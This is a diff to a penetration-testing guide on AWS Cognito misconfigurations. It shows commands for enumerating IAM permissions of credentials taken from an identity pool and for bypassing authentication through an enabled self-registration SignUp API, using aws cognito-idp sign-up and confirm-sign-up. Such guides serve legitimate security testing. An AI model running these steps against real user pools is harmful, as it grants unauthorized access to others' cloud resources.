@@ -48,15 +48,30 @@ Copy the identity-id from the response and use it in the next command.
 aws cognito-identity get-credentials-for-identity --identity-id <identity-id> --region <region>
 ```
 
-credentials using a tools such as:
+Now we can enumerate permissions associated with these credentials using a tools such as:
+* Enumreate-iam: [https://github.com/andresriancho/enumerate-iam](https://github.com/andresriancho/enumerate-iam)
+* Scout Suite: [https://github.com/nccgroup/ScoutSuite](https://github.com/nccgroup/ScoutSuite)
 
-    * Enumreate-iam: [https://github.com/andresriancho/enumerate-iam](https://github.com/andresriancho/enumerate-iam)  
-	  * Scout Suite: [https://github.com/nccgroup/ScoutSuite](https://github.com/nccgroup/ScoutSuite)
- 
- 
+
 #### Command
 ```
 ./enumerate-iam.py --access-kry <AccessKeyID> --secret-key <SecreetKey> --session-token <SessionToken>
 ```
 
+## 2. Authentication bypass due to enabled SignUp API action
 
+Self-registration enabled by default when creating a new user pool.
+We only need the client ID and region to test against the self-registration
+
+#### Command
+```
+aws cognito-idp sign-up --client-id <client-id> --username <email-address> --password <password> --region <region>
+```
+
+In case of a successful self-registration, a 6 digits confirmation code will be delivered to the attacker's email address 
+You'll need to confirm the account next
+
+#### Command
+```
+aws cognito-idp confirm-sign-up --client-id <client-id> --username <email-address> --confirmation-code <confirmation-code> --region <region>
+```
